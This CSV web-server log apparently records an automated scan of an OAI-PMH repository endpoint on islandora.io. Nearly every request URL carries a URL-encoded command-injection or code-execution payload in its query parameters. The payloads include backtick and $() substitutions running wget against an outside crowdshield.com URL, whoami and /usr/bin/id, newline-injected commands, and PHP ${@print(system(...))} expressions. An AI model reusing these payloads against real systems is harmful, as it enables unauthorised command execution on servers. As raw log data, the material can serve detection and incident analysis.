uuid,timestamp,http_status_code,request_url,response_time,http_version
252407a9-e2a3-4f02-9d0a-be89fb4e826b,2025-01-01 15:39:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,48.21 ms,HTTP/1.1
7ec56388-7f40-42e2-9a72-cbc84680eb63,2025-01-01 15:39:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=oai_dc,48.98 ms,HTTP/1.1
1de01e71-95fc-4db1-9850-ce6b12206fed,2025-01-01 15:39:22,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,62.86 ms,HTTP/1.1
8069a538-c076-4fd8-9713-20281973a3ad,2025-01-01 15:39:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,58.02 ms,HTTP/1.1
4f6aeb6e-94b5-486a-9579-4c74a5eace93,2025-01-01 15:39:23,200,http://islandora.io/oai/request?verb=ListSets,51.60 ms,HTTP/1.1
a3c87f77-de50-4150-94a9-2862002680b3,2025-01-01 15:39:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,57.42 ms,HTTP/1.1
b08575c7-ff99-4d26-9f04-1e3f0da5c399,2025-01-01 15:39:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,41.36 ms,HTTP/1.1
fd3076df-3b22-4811-ae7e-544ce2c2ff55,2025-01-01 15:39:24,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&metadataPrefix=marc,55.45 ms,HTTP/1.1
362b0176-52c8-493c-b0a2-8426a7dcdb21,2025-01-01 15:39:24,200,http://islandora.io/oai/request?verb=%24%28%60whoami%60%29,54.90 ms,HTTP/1.1
bc353f51-9d18-49ff-ac64-379bb0bd77aa,2025-01-01 15:39:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.55 ms,HTTP/1.1
436e1162-b63c-47c1-ab41-65bdc22efa5f,2025-01-01 15:39:25,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60whoami%60%29,36.12 ms,HTTP/1.1
9468381e-9c6b-4354-9cd0-fb5fa8c0345d,2025-01-01 15:39:25,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60whoami%60%29,48.84 ms,HTTP/1.1
c59a4ee6-c707-4338-849c-9a063c51d2be,2025-01-01 15:39:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60whoami%60%29,118.34 ms,HTTP/1.1
06cd0240-e268-4003-94f2-74d4ee33fce2,2025-01-01 15:39:26,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60whoami%60%29&metadataPrefix=oai_dc,57.76 ms,HTTP/1.1
95c39f22-39ac-41c5-8837-701950c6ad6a,2025-01-01 15:39:26,200,http://islandora.io/oai/request?verb=%24%3B%2Fusr%2Fbin%2Fid,56.27 ms,HTTP/1.1
cd82b739-d8f3-49de-8bcb-d236c00cf25f,2025-01-01 15:39:27,200,http://islandora.io/oai/request?verb=ListMetadataFormats,57.74 ms,HTTP/1.1
478e84fc-ebe3-4b62-89ec-87fe9177d8c1,2025-01-01 15:39:27,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%3B%2Fusr%2Fbin%2Fid,68.88 ms,HTTP/1.1
b8bb0ac4-7257-4c15-86db-61a545667d80,2025-01-01 15:39:27,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%3B%2Fusr%2Fbin%2Fid&set=%24%3B%2Fusr%2Fbin%2Fid,51.67 ms,HTTP/1.1
6e8d1cd6-6634-4c94-911c-2416fd390a69,2025-01-01 15:39:28,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid&until=%24%3B%2Fusr%2Fbin%2Fid&set=%24%3B%2Fusr%2Fbin%2Fid,49.72 ms,HTTP/1.1
57b2fb0a-3cd0-4ea7-9fe0-2a00bf63cc15,2025-01-01 15:39:28,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%3B%2Fusr%2Fbin%2Fid&metadataPrefix=marc,32.68 ms,HTTP/1.1
d121be66-5401-4b3c-a441-77b05c260898,2025-01-01 15:39:28,200,http://islandora.io/oai/request?verb=%24%7B%40print%28%22RCEVulnerable%22%29%7D,62.72 ms,HTTP/1.1
e8b82915-06a3-48aa-899e-8128e27db9c7,2025-01-01 15:39:29,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.95 ms,HTTP/1.1
61557b4c-9474-44b3-9f1c-de3e252bca9f,2025-01-01 15:39:29,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28%22RCEVulnerable%22%29%7D,62.59 ms,HTTP/1.1
a555cf7f-dcc9-4b57-8f41-f9c4a28dde4c,2025-01-01 15:39:29,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,62.06 ms,HTTP/1.1
03c84972-d1c3-4b19-bf73-6e906f1a021b,2025-01-01 15:39:30,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,95.99 ms,HTTP/1.1
b6e24601-9aae-4729-8d8f-d688275f976e,2025-01-01 15:39:30,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D&metadataPrefix=marc,45.63 ms,HTTP/1.1
9df5d78c-8e9b-4863-97b8-755e465ad591,2025-01-01 15:39:31,200,http://islandora.io/oai/request?verb=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,65.88 ms,HTTP/1.1
98db92bd-b477-460e-af5a-881edf19529d,2025-01-01 15:39:31,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,39.82 ms,HTTP/1.1
03d71947-a25f-4e52-9360-d65ea0e2898e,2025-01-01 15:39:31,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,64.39 ms,HTTP/1.1
70087637-d447-49e2-b2c9-27fb8b275705,2025-01-01 15:39:32,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,58.56 ms,HTTP/1.1
fd978cab-dc57-4915-bef2-46bcc7c991cc,2025-01-01 15:39:32,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,91.81 ms,HTTP/1.1
2c267acd-9659-407f-a82f-61bf5af7d1e1,2025-01-01 15:39:32,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&metadataPrefix=oai_dc,53.31 ms,HTTP/1.1
a429f3a1-cdd6-43fd-982f-aceb0e38356d,2025-01-01 15:39:33,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid,64.00 ms,HTTP/1.1
1d217f17-8ca0-4ea6-be57-76cf662d192c,2025-01-01 15:39:33,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.04 ms,HTTP/1.1
fb3afb5e-83a9-4e15-88d4-18437e5e3c22,2025-01-01 15:39:33,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid,48.91 ms,HTTP/1.1
56f32d90-7797-4f5b-bf3b-4e6b6d26c58e,2025-01-01 15:39:34,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,52.53 ms,HTTP/1.1
ae72918b-e0a9-4f65-8d0e-a35b30e225cb,2025-01-01 15:39:34,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid&until=%250A%2Fusr%2Fbin%2Fid,38.65 ms,HTTP/1.1
2511ee74-20b9-48b9-bc4c-6edcd2c0f764,2025-01-01 15:39:34,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid&metadataPrefix=marc,38.88 ms,HTTP/1.1
87fdb6fe-9d5a-4bc3-8c26-806f9b435d4a,2025-01-01 15:39:35,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid%250A,50.91 ms,HTTP/1.1
aa92292a-a3af-424d-86b3-65ba7fe78566,2025-01-01 15:39:35,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250A%2Fusr%2Fbin%2Fid%250A,76.14 ms,HTTP/1.1
b89695eb-fb49-4a64-b0d8-c8c4cd681492,2025-01-01 15:39:35,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid%250A,60.79 ms,HTTP/1.1
a1085265-649f-498c-b4c6-4ce66c627746,2025-01-01 15:39:36,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,78.81 ms,HTTP/1.1
bcb951ca-1754-415f-b3d4-1677c0896336,2025-01-01 15:39:36,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250A%2Fusr%2Fbin%2Fid%250A&until=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,85.52 ms,HTTP/1.1
6b939c42-b496-4f9e-a0d2-13779e2a2dba,2025-01-01 15:39:36,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid%250A&metadataPrefix=oai_dc,74.36 ms,HTTP/1.1
